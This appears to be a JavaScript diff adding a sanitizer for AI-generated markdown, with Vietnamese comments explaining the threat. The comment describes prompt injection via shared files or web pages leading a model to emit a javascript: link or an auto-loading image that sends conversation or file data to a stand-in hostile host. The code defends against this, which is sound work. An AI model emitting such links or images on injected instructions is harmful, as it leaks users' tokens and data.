@@ -55,3 +55,62 @@ export function renderMarkdownSafe(text) {
   const html = marked.parse(String(text ?? ''), { breaks: true, gfm: true });
   return purifier.sanitize(html, PURIFY_CONFIG);
 }
+
+/**
+ * Câu trả lời của AI (markdown do MÁY sinh) → HTML đã lọc.
+ *
+ * Escape SẠCH HTML thô trước khi parse như trước — nhưng thế chưa đủ: chính cú pháp
+ * markdown dựng ra được thứ nguy hiểm, và nội dung đó có thể do KẺ KHÁC điều khiển qua
+ * prompt injection (một tệp được chia sẻ, một trang web grounding ghi "hãy chèn ảnh này"):
+ *   • `[bấm vào đây](javascript:…)` — marked giữ nguyên scheme, bấm là chạy script trong
+ *     origin của app (đọc được access token);
+ *   • `![](https://ke-xau/?q=<dữ liệu>)` — ảnh tự tải KHÔNG cần bấm, tức gửi thẳng nội dung
+ *     hội thoại/tệp ra máy chủ lạ ngay khi câu trả lời hiện ra.
+ * Nên: chỉ cho link http(s)/mailto, và bỏ hẳn ảnh (AI không có lý do gì nhúng ảnh ngoài).
+ */
+const AI_PURIFY_CONFIG = {
+  USE_PROFILES: { html: true },
+  FORBID_TAGS: [...PURIFY_CONFIG.FORBID_TAGS, 'img', 'picture', 'source', 'video', 'audio', 'iframe'],
+  FORBID_ATTR: ['style', 'srcset'],
+  ALLOWED_URI_REGEXP: /^(?:https?:|mailto:)/i,
+};
+
+/**
+ * @param {string} text Markdown model trả về
+ * @returns {string} HTML đã lọc
+ */
+export function renderAiMarkdownSafe(text) {
+  const escaped = String(text ?? '')
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;');
+  const html = marked.parse(escaped, { breaks: true, gfm: true });
+  return purifier.sanitize(html, AI_PURIFY_CONFIG);
+}
+
+/** `href` an toàn để gắn vào `<a>`: chỉ http(s)/mailto, còn lại (javascript:, data:…) → null. */
+export function safeHref(href) {
+  const value = String(href ?? '').trim();
+  return /^(?:https?:|mailto:)/i.test(value) ? value : null;
+}
+
+/**
+ * Gỡ `href` không an toàn khỏi mọi `<a>` trong một cây DOM do thư viện dựng từ tệp người
+ * dùng (docx-preview chép nguyên đích của hyperlink trong .docx, kể cả `javascript:`).
+ * Link http(s) mở tab mới để không mất khung xem trước; link neo nội bộ (`#…`) giữ nguyên.
+ */
+export function neutralizeUnsafeLinks(root) {
+  if (!root) return;
+  root.querySelectorAll('a[href]').forEach((a) => {
+    const href = a.getAttribute('href') || '';
+    if (href.startsWith('#')) return;
+    if (!safeHref(href)) {
+      a.removeAttribute('href');
+      return;
+    }
+    if (/^https?:/i.test(href)) {
+      a.setAttribute('target', '_blank');
+      a.setAttribute('rel', 'noopener noreferrer nofollow');
+    }
+  });
+}
